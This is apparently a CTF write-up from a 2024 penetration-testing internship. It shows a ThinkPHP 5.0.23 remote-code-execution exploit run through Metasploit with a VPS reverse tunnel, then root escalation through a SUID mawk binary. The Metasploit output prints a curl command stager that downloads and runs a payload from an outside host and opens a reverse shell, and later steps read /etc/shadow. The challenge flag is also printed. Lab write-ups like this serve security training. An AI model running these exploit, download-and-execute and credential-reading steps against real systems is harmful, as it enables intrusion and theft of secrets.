---
title: AWKWARD Writeup | CyberTalents Penetration Testing Internship Program 2024
  CTF
tags:
- cybersecurity
- cybertalents
- php
- awk
- ctf
---

# AWKWARD - Medium

## Exploitation

First, when I opened the given link, I noticed that it is a like a template.

![home page](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-1.png)
![technology stack](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-2.png)

So, I went to search for exploits for it and I found a module that exploits an RCE vulnerability in it using `metasploit` framework. The module is called `exploit/unix/webapp/thinkphp_rce`.

![search module in msf](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-3.png)

I tried to use the module, but it did not work, although it said that the version `5.0.23` is vulnerable.

I spent a lot of time trying to find a way to exploit it. Upon searching for the reason, I discovered that to get remote shells on the target, I have to use a VPS, or enable `Port Forwarding` on my router, which is not possible for security reasons obviously :).

So, I went to learn about spinning up a Virtual Private Server (VPS) on DigitalOcean in order to get reverse shells! This was my first time.

Then, I connected to it and edited the file `/etc/ssh/sshd_config` and added:

``` bash
PortForwarding yes
GatewayPorts yes
```

Then restarted the service. Now, our server is ready to get reverse shells.

But first, we need to do a reverse tunnel from my - attacking - machine to the VPS on the port which will receive the reverse shell from the target machine. This [article](https://medium.com/@nikosch86/how-to-metasploit-behind-a-nat-or-pivoting-and-reverse-tunneling-with-meterpreter-1e747e7fa901) helped me to understand that more! So, I connected via a reverse ssh tunnel to the VPS on port `7777`:

![alt text](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image.png)

I set the `LPORT` to `7777`, `LHOST` to the VPS IP, and the `RHOST` to the target machine IP, `VHOST` to the url of the website!

After that, I went back to the exploit and tried to make it work, however, it would say `Server Stopped` and I could not get a reverse shell.

I changed the payload from `reverse_tcp` to `bind_tcp`, even used `reverse_http` but it did not work. I increased the waiting time to get the connection to 20 seconds because it kept telling me that the connection had timeout although `Command Stager Progress was always 100%`. I even changed the payload to a simpler one: `linux/x64/shell_reverse_tcp` but it did not work too.

The `Server Stopped` message was the key here! So, I turned my focus to the `CMDStager` options: `SRVHOST`, and `SRVPORT`.
Initially, they were set to `0.0.0.0` and `8080` respectively. I changed the `SRVHOST` to the VPS IP and the `SRVPORT` to `7777` and it did not work too!

After carefully understand the issue again, I noticed that I did not open a reverse tunnel of port `8080` to the VPS. So, I did that and set the `SRVPORT` to `8080` and it worked!

![8080 reverse tunnel](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-4.png)

the final options were:

``` bash
msf6 exploit(unix/webapp/thinkphp_rce) > options

Module options (exploit/unix/webapp/thinkphp_rce):

   Name       Current Setting                              Required  Description
   ----       ---------------                              --------  -----------
   Proxies                                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     13.56.31.114                                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                                                     cs/using-metasploit.html
   RPORT      80                                           yes       The target port (TCP)
   SSL        false                                        no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                                 no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                                            yes       Base path
   URIPATH                                                 no        The URI to use for this exploit (default is random)
   VHOST      wcomj0wz05phw3oe6dv911kb43lgrdzlwq6oiy3l-we  no        HTTP server virtual host
              b.cybertalentslabs.com


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to
                                        listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  [VPS IP]         yes       The listen address (an interface may be specified)
   LPORT  7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper



View the full module info with the info, or info -d command.
```

After hitting `run`, we got a shell on the target machine:

``` bash
msf6 exploit(unix/webapp/thinkphp_rce) > run

[-] Handler failed to bind to 167.172.170.218:7777:-  -
[*] Started reverse TCP handler on 0.0.0.0:7777 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. ThinkPHP 5.0.23 is a vulnerable version.
[*] Targeting ThinkPHP 5.0.23 automatically
[*] Using URL: http://167.172.170.218:8080/EIQ6EWBsN3W
[*] Generated command stager: ["curl -so /tmp/sXGKarJH http://167.172.170.218:8080/EIQ6EWBsN3W;chmod +x /tmp/sXGKarJH;/tmp/sXGKarJH;rm -f /tmp/sXGKarJH"]
[*] Executing command: curl -so /tmp/sXGKarJH http://167.172.170.218:8080/EIQ6EWBsN3W;chmod +x /tmp/sXGKarJH;/tmp/sXGKarJH;rm -f /tmp/sXGKarJH
[*] Client 127.0.0.1 (curl/7.52.1) requested /EIQ6EWBsN3W
[*] Sending payload to 127.0.0.1 (curl/7.52.1)
[*] Command shell session 1 opened (127.0.0.1:7777 -> 127.0.0.1:37760) at 2024-08-02 08:24:37 -0400


[+] Successfully executed command: curl -so /tmp/sXGKarJH http://167.172.170.218:8080/EIQ6EWBsN3W;chmod +x /tmp/sXGKarJH;/tmp/sXGKarJH;rm -f /tmp/sXGKarJH
[*] Command Stager progress - 100.00% done (119/119 bytes)
[*] Server stopped.



id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
/bin/bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<rdzlwq6oiy3l-web-7597fd5dbc-6s8x7:/var/www/public$ ls -lah
ls -lah
total 184K
drwxrwxr-x 1 www-data www-data   37 Aug  2 12:17 .
drwxr-xr-x 1 www-data www-data   35 Jan 11  2019 ..
-rw-rw-r-- 1 www-data www-data  216 Dec 10  2018 .htaccess
-rw------- 1 www-data www-data 200K Aug  2 12:17 core.102
-rw------- 1 www-data www-data 200K Aug  2 12:17 core.98
-rw-rw-r-- 1 www-data www-data 1.2K Dec 10  2018 favicon.ico
-rw-rw-r-- 1 www-data www-data  766 Dec 10  2018 index.php
-rw-rw-r-- 1 www-data www-data   24 Dec 10  2018 robots.txt
-rw-rw-r-- 1 www-data www-data  840 Dec 10  2018 router.php
drwxrwxr-x 1 www-data www-data   24 Dec 10  2018 static
```

## Privilege Escalation

I went to check the files on the system, and I found a user under the `/home` directory called `james`. I checked the `sudo` commands for the current user (`www-data`) but sudo was not installed on the server.

I checked the home directory of the user `james` and found nothing interesting:

![james home directory](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-5.png)

even the `tar` executable belongs to `root` and we can execute it, it will execute with `james` privileges, not `root` privileges.

Which actually makes us think about the SUID binaries, which can be executed as root! I used the command `find / -perm -u=s -type f 2>/dev/null` and found this:

![alt text](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-6.png)

From the output, I opened [GTFOBins - mawk](https://gtfobins.github.io/gtfobins/mawk/#suid) and found that we can read files as root using `mawk`, so I tested that and read the `/etc/shadow` file:

![gtfo bins mawk](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-7.png)

![reading shadow file](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-8.png)

I got the hash of the user `james` and checked [CrackStation.net](https://crackstation.net/) but did not find the password.

![crackstation james](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-11.png)

When I looked back to the page of `GTFOBins`, I found that we can execute commands as root using `mawk`! So, I tried to execute the command `id` as root and it worked!

![gtfo bins mawk root shell](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-9.png)

![got root and flag](https://raw.githubusercontent.com/omar-danasoury/personal-website/master/assets/images/posts/cybertalents-ctf-awkward/image-10.png)

From there, we can read the flag as shown in the screenshot!

``` bash
cat /root/flag
FLAG{awk3D_m4y_w4y_in}
```

## References

1. [How to Metasploit Behind a NAT or: Pivoting and Reverse Tunneling with Meterpreter](https://medium.com/@nikosch86/how-to-metasploit-behind-a-nat-or-pivoting-and-reverse-tunneling-with-meterpreter-1e747e7fa901).
2. [GTFOBins - mawk](https://gtfobins.github.io/gtfobins/mawk/#suid).
3. [CrackStation.net](https://crackstation.net/).
